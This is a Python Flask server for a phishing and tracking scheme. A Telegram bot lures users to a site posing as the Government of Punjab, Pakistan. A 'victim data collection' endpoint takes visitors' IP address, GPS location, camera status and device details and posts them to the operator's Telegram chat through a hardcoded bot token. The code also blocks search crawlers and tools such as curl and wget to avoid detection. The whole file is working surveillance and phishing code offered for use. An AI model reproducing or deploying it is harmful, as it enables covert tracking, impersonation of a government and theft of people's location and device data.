from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

BOT_TOKEN = '7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg'
CHAT_ID = '6908281054'

# === Block User-Agents (Bots etc.) ===
BAD_AGENTS = ["bot", "crawler", "spider", "Google", "Bing", "Yahoo", "curl", "wget"]

@app.before_request
def block_bots():
    ua = request.headers.get('User-Agent', '').lower()
    for bot in BAD_AGENTS:
        if bot.lower() in ua:
            return "Access Denied", 403

# === Front Page Serve (from your HTML) ===
@app.route("/")
def index():
    with open("index.html", "r", encoding="utf-8") as f:
        return render_template_string(f.read())

# === Victim Data Collection Endpoint ===
@app.route("/collect", methods=["POST"])
def collect():
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    location = f"📍 Latitude: {data.get('latitude')}\n📍 Longitude: {data.get('longitude')}" if data.get("latitude") else "❌ Location Not Available"
    camera_status = data.get("camera", "❓ Unknown")
    user_agent = data.get("userAgent", "❓ Unknown")
    device_info = data.get("deviceInfo", "❓")

    text = f"""👁️ شکار آیا!
🌐 IP Address: {ip}
📱 Device: {user_agent}
📍 Location: {location}
📷 Camera: {camera_status}
🧠 Device Info: {device_info}
"""
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
        "chat_id": CHAT_ID,
        "text": text
    })
    return "OK"

# === Telegram Bot /start Handling ===
@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def telegram_webhook():
    update = request.get_json()
    if "message" in update:
        chat_id = update["message"]["chat"]["id"]
        if update["message"].get("text") == "/start":
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
                "chat_id": chat_id,
                "text": "👋 خوش آمدید!\n👇 لنک پر کلک کریں:\nhttps://govt-of-punjab-pak.onrender.com"
            })
    return "ok"

# === Run App ===
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
